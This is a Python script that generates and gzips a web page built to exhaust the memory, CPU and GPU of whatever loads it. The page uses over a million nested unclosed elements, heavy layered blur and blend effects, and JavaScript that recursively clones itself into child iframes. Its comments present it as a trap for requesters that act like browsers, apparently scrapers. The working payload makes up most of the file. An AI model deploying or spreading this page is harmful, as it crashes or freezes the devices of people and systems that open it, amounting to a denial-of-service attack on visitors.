#!/usr/bin/env python3


def createHtml():
    # generates a webpage that tries to exhaust resources in a few different ways. the goal is to use more resources
    # the closer the requester is to a fully featured web browser.
    # 0. the page is highly repetitive: very small file after compression. the goal is to exhaust resources of the
    #    requester while minimizing the impact on the server
    # 1. if the requester tries to build a DOM from the html: more than a million nested elements will use considerable
    #    resources to build and hold in memory. additionally, the error handling is also exercised: the markup is
    #    invalid (div elements must be closed, closing p elements is optional). browsers handles this kind of error
    #    by closing the div right before the end of body. most browser nowadays also limit the nesting depth to ~512
    #    by reparenting the excessively deep elements (https://bugzilla.mozilla.org/show_bug.cgi?id=256180).
    # 2. if the requester hasn't crashed and tries to render the page: the elements are placed on top of each other
    #    and they are also partially transparent. depending on how the requester renders the page it might use
    #    significant gpu and / or cpu time to create the visual appearance of the page
    # 3. if the requester hasn't crashed after rendering the page and tries to run the javascript: use the rabbit virus
    #    technique to further exhaust resources. infinitely copy itself to new child iframes, which then also
    #    infinitely copy itself to new child iframes, etc. while most modern browsers limit the nesting depth of
    #    iframes and the total amount of browsing contexts (https://github.com/WebKit/WebKit/pull/7219), resource
    #    exhaustion will probably happen earlier than those limits
    PREFIX = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="black">
<meta name="referrer" content="no-referrer">
<meta name="application-name" content="div">
<meta name="author" content="p">
<meta name="description" content="div">
<meta name="generator" content="p">
<meta name="keywords" content="div">
<meta name="creator" content="p">
<meta name="publisher" content="p">
<title>div</title>
<link rel="icon" href="https://a.test/i.ico">
<style>
:root {
counter-reset: num;
}
html, body, div, p, iframe, *::before, *::after {
counter-increment: num;
height: 100%;
width: 100%;
position: absolute;
top: 0;
left: 0;
overflow: hidden;
padding: 0;
margin: 0;
border: 0;
background: radial-gradient(rgba(0, 0, 0, 0.1) 90%, rgba(2, 2, 2, 0.8) 99%), transparent;
background-blend-mode: screen;
mix-blend-mode: screen;
z-index: 0;
filter: brightness(0.9) sepia(0.1) saturate(0.9) hue-rotate(1deg) blur(1px) opacity(0.9);
display: block;
color: white;
text-align: center;
font: 500 semi-expanded 12px/3 sans-serif;
content: "{ " counter(num, decimal-leading-zero) " }";
}
iframe.bad {
z-index: -1;
transform: scale(0.99) skew(1deg) rotate(1grad);
animation: 9s ease-in-out 9s infinite alternate pain;
}
@keyframes pain {
0% {
transform: scale(0.99) skew(1deg) rotate(1grad);
filter: brightness(0.9) sepia(0.1) saturate(0.9) hue-rotate(1deg) blur(1px) opacity(0.9);
}
50% {
transform: scale(1) skew(0) rotate(0);
filter: brightness(0.8) sepia(1) saturate(0.1) hue-rotate(1turn) blur(1cm) opacity(0.8);
}
100% {
transform: scale(0.99) skew(-1deg) rotate(-1grad);
filter: brightness(0.9) sepia(0.1) saturate(0.9) hue-rotate(1deg) blur(1px) opacity(0.9);
}
}
</style>
<body>
'''
    SUFFIX = r'''
<iframe class="bad" sandbox="allow-scripts" credentialless loading="lazy" src="index.html"></iframe>
<script>
"use strict";
var firstFrame = document.getElementsByTagName("iframe")[0];
firstFrame.removeAttribute("class");
firstFrame.removeAttribute("src");
firstFrame.insertAdjacentElement("afterend", firstFrame.cloneNode());
window.onload = function () {
    var htmlContent = ["<!DOCTYPE html>\n" + document.documentElement.outerHTML];
    var blobUrl = URL.createObjectURL(new Blob(htmlContent, { type: "text/html" }));
    for (var allFrames = document.querySelectorAll("iframe"), i = 0; i < allFrames.length; i++) {
        var current = allFrames[i];
        current.src = blobUrl + "#" + Math.random().toString(2);
        current.style = "opacity:" + (0.9 + Math.random()/10) + "; rotate:" + (0.5 - Math.random()) + "grad; scale:" + (0.995 + Math.random()/100) + "; z-index:" + Math.floor(-1 - Math.random()*9999) + ";";
        current.className = "bad";
    }
};
</script>'''
    ELEM = r'<div><p>'
    elem_arr = [ELEM] * 1048000
    elem_str = ''.join(elem_arr)
    return PREFIX + elem_str + SUFFIX


if __name__ == '__main__':
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with open('public/index.html', mode='wt', encoding='utf-8', newline='\n') as html_file:
        html_file.write(createHtml())
        html_file.flush()

    import subprocess
    subprocess.run(['gzip', '-f', '-n', '-v', '-k', '--best', 'public/index.html'], check=True)
